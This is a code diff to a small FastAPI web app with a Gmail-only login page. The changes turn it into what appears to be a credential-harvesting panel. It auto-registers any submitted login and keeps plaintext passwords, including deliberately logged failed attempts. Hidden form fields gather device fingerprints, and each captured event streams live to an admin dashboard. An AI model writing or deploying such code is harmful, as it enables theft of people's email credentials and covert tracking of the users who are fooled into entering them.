@@ -10,7 +10,7 @@ import os
 
 # ---------- In-memory prototype stores (NOT for production) ----------
 users = {}  # username -> password (plaintext here for prototype only)
-login_events = []  # list of dicts {username, password, ip, ts}
+login_events = []  # list of dicts {username, password, ip, ts, ...}
 
 # Admin secret for accessing admin pages (set to something secure locally)
 ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "adminpass")  # change for local use
@@ -25,24 +25,55 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
 # ---------- Helpers ----------
-def record_login(request: Request, username: str, password: str):
+def record_login(
+    request: Request, 
+    username: str, 
+    password: str,
+    client_os: str,
+    client_browser: str,
+    client_resolution: str,
+    client_timezone: str,
+    client_language: str,
+    client_cpu_cores: str,
+    client_user_agent: str
+):
     ip = request.client.host if request.client else "unknown"
     ts = datetime.datetime.utcnow().isoformat() + "Z"
-    event = {"username": username, "password": password, "ip": ip, "ts": ts}
+    
+    event = {
+        "username": username, 
+        "password": password, 
+        "ip": ip, 
+        "ts": ts,
+        "os": client_os,
+        "browser": client_browser,
+        "resolution": client_resolution,
+        "timezone": client_timezone,
+        "language": client_language,
+        "cpu_cores": client_cpu_cores,
+        "user_agent": client_user_agent
+    }
+    
     login_events.append(event)
+    
     # Emit to connected admin dashboards
     try:
-        # broadcast to namespace default
         import asyncio
         asyncio.create_task(sio.emit("login_event", event))
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"SocketIO emit error: {e}")
+        
     return event
 
 def check_admin_token(request: Request):
     token = request.cookies.get("admin_token")
     if token != ADMIN_SECRET:
-        raise HTTPException(status_code=401, detail="Admin auth required")
+        # Redirect to login if not authenticated
+        raise HTTPException(
+            status_code=307, 
+            detail="Admin auth required", 
+            headers={"Location": "/admin/login"}
+        )
     return True
 
 # ---------- Routes: Public ----------
@@ -56,21 +87,16 @@ def signup_get(request: Request):
 
 @app.post("/signup")
 async def signup_post(request: Request, username: str = Form(...), password: str = Form(...)):
-    # Ensure username ends with @gmail.com
     if not username.endswith("@gmail.com"):
         return templates.TemplateResponse(
             "signup.html",
             {"request": request, "error": "Email must end with @gmail.com"}
         )
-
-    # Check if username already exists
     if username in users:
         return templates.TemplateResponse(
             "signup.html",
             {"request": request, "error": "This Gmail address is already registered."}
         )
-
-    # Save new user (prototype — plaintext storage, not for production)
     users[username] = password
     return templates.TemplateResponse(
         "signup.html",
@@ -83,33 +109,52 @@ def login_get(request: Request):
     return templates.TemplateResponse("login.html", {"request": request})
 
 @app.post("/login")
-async def login_post(request: Request, username: str = Form(...), password: str = Form(...)):
-    # Ensure @gmail.com is present
+async def login_post(
+    request: Request, 
+    username: str = Form(...), 
+    password: str = Form(...),
+    # NEW: Receive client info from hidden fields
+    client_os: str = Form("N/A"),
+    client_browser: str = Form("N/A"),
+    client_resolution: str = Form("N/A"),
+    client_timezone: str = Form("N/A"),
+    client_language: str = Form("N/A"),
+    client_cpu_cores: str = Form("N/A"),
+    client_user_agent: str = Form("N/A")
+):
     if not username.endswith("@gmail.com"):
         return templates.TemplateResponse(
             "login.html",
-            {"request": request, "error": "Email must end with @gmail.com"}
+            {"request": request, "error": "Email must end with @gmail.com", "form": {"username": username}}
         )
 
-    # Check user in DB
+    # Function to pass all data to the logger
+    def log_the_login():
+        record_login(
+            request, username, password,
+            client_os, client_browser, client_resolution,
+            client_timezone, client_language, client_cpu_cores, client_user_agent
+        )
+
     pw = users.get(username)
     if pw is None:
-        # Auto-register if user doesn’t exist (optional)
+        # Auto-register
         users[username] = password
-        record_login(request, username, password)
+        log_the_login()
         resp = RedirectResponse(url="/", status_code=302)
         resp.set_cookie("user", username, httponly=True)
         return resp
 
-    # Validate password
     if pw != password:
+        # Note: We still log the *attempted* password
+        log_the_login()
         return templates.TemplateResponse(
             "login.html",
-            {"request": request, "error": "Invalid password."}
+            {"request": request, "error": "Invalid password.", "form": {"username": username}}
         )
 
     # Record successful login
-    record_login(request, username, password)
+    log_the_login()
     resp = RedirectResponse(url="/", status_code=302)
     resp.set_cookie("user", username, httponly=True)
     return resp
@@ -128,36 +173,21 @@ def admin_login_post(request: Request, password: str = Form(...)):
     resp.set_cookie("admin_token", ADMIN_SECRET, httponly=True)
     return resp
 
-# --- NEW: API Route for Users Tab ---
-# This route is required for the "Users" tab to auto-refresh
 @app.get("/api/get_users", dependencies=[Depends(check_admin_token)])
 def api_get_users():
-    # In a real app, you'd fetch this from the database
     return users 
 
-# --- REMOVED ROUTES ---
-# These routes are no longer needed because they are now tabs
-# in the main dashboard.
-#
-# @app.get("/admin/users", ...)
-# @app.get("/admin/logs", ...)
-
-# --- MODIFIED: Main Dashboard Route ---
-# This single route now renders the combined dashboard.
 @app.get("/admin/dashboard", response_class=HTMLResponse, dependencies=[Depends(check_admin_token)])
 def admin_dashboard(request: Request):
-    # This page now needs to be pre-populated with data
-    # for all tabs (Users and Logs).
     return templates.TemplateResponse("admin_dashboard.html", {
         "request": request,
-        "users": users,                 # Pass user data for the "Users" tab
-        "events": reversed(login_events) # Pass log data for the "Logs" tab
+        "users": users,
+        "events": reversed(login_events)
     })
 
-# ---------- Socket.IO events (optional admin-driven) ----------
+# ---------- Socket.IO events ----------
 @sio.event
 async def connect(sid, environ):
-    # Optionally you could verify admin cookies here
     print("Socket connected:", sid)
 
 @sio.event
